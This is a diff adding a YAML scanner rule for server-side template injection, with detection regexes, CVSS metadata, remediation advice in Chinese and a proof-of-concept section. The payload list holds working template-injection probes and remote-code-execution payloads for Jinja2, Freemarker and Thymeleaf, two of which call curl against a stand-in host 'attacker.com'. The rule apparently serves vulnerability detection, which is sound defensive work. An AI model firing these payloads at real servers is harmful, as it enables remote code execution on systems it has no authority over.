@@ -1,0 +1,102 @@
+id: "rule-ssti"
+name: "Server-Side Template Injection (SSTI)"
+name_cn: "服务器端模板注入"
+description: "用户输入被直接传入模板引擎渲染，攻击者可注入模板语法执行任意代码"
+
+owasp_category: "A03-injection"
+owasp_subcategory: "SSTI"
+cwe_id: "CWE-1336"
+
+cvss:
+  vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+  base_score: 9.8
+  severity: "critical"
+
+detection:
+  methods: ["DAST", "SAST"]
+  dast_signals:
+    high_specificity:
+      - type: "template_execution_confirmed"
+        pattern: "payload_outputs_math_result_or_command_output"
+        confidence: 0.95
+    medium_specificity:
+      - type: "template_syntax_reflected"
+        pattern: "{{7*7}}.*49|${7*7}.*49|<%=.*7.*7.*49"
+        confidence: 0.85
+    low_specificity:
+      - type: "template_engine_detected"
+        pattern: "(Jinja2|Twig|Smarty|Velocity|Freemarker|Thymeleaf)"
+        confidence: 0.40
+  sast_patterns:
+    - language: "python"
+      pattern: "render_template_string\\(.*\\+|Template\\(.*request"
+      confidence: 0.85
+    - language: "java"
+      pattern: "TemplateEngine.*process\\(.*request|Velocity.*evaluate"
+      confidence: 0.80
+  multi_layer:
+    enabled: true
+    min_signals: 2
+    high_specificity_skips_min: true
+  false_positive_filters:
+    - filter: "autoescape_enabled"
+      condition: "template_autoescape_on"
+      action: "downgrade"
+      target_confidence: "low"
+
+poc:
+  enabled: true
+  request_template: |
+    GET {{url}}?{{param}}={{payload}} HTTP/1.1
+    Host: {{host}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+    Accept: */*
+    Connection: close
+  payloads:
+    - name: "jinja2_math"
+      value: "{{7*7}}"
+      description: "Jinja2 数学运算探测（期望 49）"
+      risk: "low"
+    - name: "twig_math"
+      value: "{{7*7}}"
+      description: "Twig 数学运算探测"
+      risk: "low"
+    - name: "smarty_math"
+      value: "{php}echo 7*7;{/php}"
+      description: "Smarty {php} 标签"
+      risk: "medium"
+    - name: "jinja2_rce"
+      value: "{{''.__class__.__mro__[1].__subclasses__()}}"
+      description: "Jinja2 RCE 遍历子类"
+      risk: "high"
+    - name: "freemarker_rce"
+      value: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"curl http://attacker.com/rce\")}"
+      description: "Freemarker RCE"
+      risk: "critical"
+    - name: "thymeleaf_rce"
+      value: "__${T(java.lang.Runtime).getRuntime().exec('curl http://attacker.com/rce')}::.thread.#echo"
+      description: "Thymeleaf RCE CVE-2023-22602"
+      risk: "critical"
+  verification:
+    - type: "math_result"
+      pattern: "49"
+      description: "{{7*7}} 被渲染为 49"
+    - type: "callback_received"
+      description: "RCE payload 触发 OOB 回调"
+
+remediation:
+  priority: "P0"
+  summary: "禁止将用户输入拼接到模板，使用沙箱化模板引擎"
+  details:
+    - "使用模板引擎的数据绑定功能，禁止字符串拼接模板"
+    - "启用模板自动转义（autoescape）"
+    - "禁用模板引擎的危险函数（文件操作、命令执行）"
+    - "使用沙箱限制模板可访问的对象和方法"
+  references:
+    - "https://owasp.org/Top10/A03_2021-Injection/"
+    - "https://cwe.mitre.org/data/definitions/1336.html"
+    - "https://portswigger.net/research/server-side-template-injection"
+
+knowledge_source:
+  file: "知识库/el-injection-test.md"
+  methodology: "知识库/el-injection-test.md + SSTI 检测"
